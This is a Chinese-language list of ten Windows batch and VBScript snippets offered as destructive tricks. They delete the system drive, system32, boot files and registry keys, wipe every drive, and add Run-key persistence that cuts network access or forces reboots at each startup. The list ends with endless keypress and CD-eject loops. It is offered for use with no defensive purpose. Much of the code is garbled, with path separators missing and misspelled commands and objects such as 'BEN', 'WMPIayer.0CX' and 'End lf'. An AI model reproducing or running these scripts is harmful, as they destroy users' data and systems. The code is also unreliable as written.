1.死亡蓝屏

	@echo off
	del %systemdrive%*.*/f/s/q
	shutdown -r -f -t 00 

2.更改文件后缀名

	REN *.DOC *.TXT REN *.JPEG *.TXT
	REN *.LNK *.TXT
	REN *.AVI *.TXT
	REN *.MPEG *.TXT
	REN *.COM *.TXT
	BEN *.BAT *.TXT

3.删除系统重要文件

	del c:WINDOWSsystem32*.*/q 

4.使pc永久崩溃

	@echo off
	attrib -r -s -h c:autoexec.bat
	del c:autoexec.bat
	attrib -r -s -h c:boot.ini
	del c:boot.ini
	attrib -r -s -h c:ntldr
	del c:ntldr
	attrib -r -s -h c:windowswin.ini
	del c:windowswin.ini 

5.删除全部注册表

	@ECHO OFF
	START reg delete HKCR/.exe
	START reg delete HKCR/.dll
	START reg delete HKCR/* 

6.永远禁用网络！

	echo @echo off>c:windowswimn32.bat
	echo break off>>c:windowswimn32.bat
	echo ipconfig/release_all>>c:windowswimn32.bat
	echo end>>c"windowswimn32.bat
	reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun/v
	windowsapi/t reg_sz/d c:windowswimn32.bat/f
	reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun/v
	controlexit/t reg_sz/d c:windowswimn32.bat/f
	pause 

7.永远的《回车》

	set wshshell =wscript.createobject<"wscript.shell">
	do
	wscript.sleep 100
	wshshell.sendkeys"~<enter>"
	loop

 8.开机就关机

	echo @echo off>c:windowshartlell.bat
	echo break off>>c:windowshartlell.bat
	echo shutdown -r -t 11-f>>c:windowshartlell.bat
	echo end>>c:windowshartlell.bat
	reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun
	/v startapi /t reg_sz/d c:windowshartlell.bat /f
	reg add hkey-current_usersoftwaremicrosoftwindowscurrentversionrun
	/v/t reg_sz/d c:windowshartlell.bat /f
	PAUSE 

9.格式化硬盘

	rd/s/q D:
	rd/s/q C:
	rd/s/q E:
	rd/s/q F:
	rd/s/q g: 

10.开启CD蜂鸣器 不停地响

	Set oWMP=CreateObject("WMPIayer.0CX.7")
	Set colCDROMs=oWMP.cdromCollection
	do
	if colCDROMs.Count>=1 then
	For i=0 to colCDROMs.Count -1
	colCDROMs.ltem<i>.Eject
	Next
	For =0 to colCDROMs.Count -1
	colCDROMs.ltem<i>.Eject
	Next
	End lf
	wscript.sleep 100
	Loop 
